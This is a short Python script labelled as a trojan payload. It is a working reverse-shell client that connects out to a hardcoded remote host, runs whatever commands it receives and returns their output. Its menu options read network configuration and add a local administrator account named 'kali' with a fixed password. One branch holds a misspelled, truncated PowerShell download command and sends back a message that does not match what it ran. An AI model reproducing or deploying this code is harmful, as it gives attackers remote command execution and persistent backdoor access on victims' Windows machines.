##
# SIMPLE PAYLOAD FOR TROJAN PYTHON 
#@author - Jerome Themee - security analyst 
#@date - 16/07/2015
##
import socket
import subprocess

# target
target_host = "10.94.71.26"
target_port = 9004
localIp = socket.gethostbyname(socket.gethostname())

# create the socket object with python
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

#run command function
def run_command(cmd):
    '''given shell command, returns communication tuple of stdout and stderr'''
    return subprocess.Popen(cmd,
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE, 
                            stdin=subprocess.PIPE).communicate()


while 1 :

    response = client.recv(4096)

    if response=="1":
        outputCommand =  run_command("ipconfig")[0]
        client.send(outputCommand)

    elif response == "2":
        outputCommand = run_command("net user kali Azerty123456 /add")[0]
        outputCommand = run_command("net localgroup administrateurs kali /add")[0]
        client.send("Compte cree kali Azerty123456 ")

    elif response == "3":
        outputCommand = run_command("powershell.exe -command Invoke-WebResquest https")[0]
        client.send("Compte cree kali Azerty123456 ")

    elif response == "4":
        outputCommand = run_command("net user kali Azerty123456 /add")[0]
        outputCommand = run_command("net localgroup administrateurs kali /add")[0]
        client.send("Compte cree kali Azerty123456 ")

    else :
        outputCommand = run_command(response)[0]
        client.send(outputCommand)


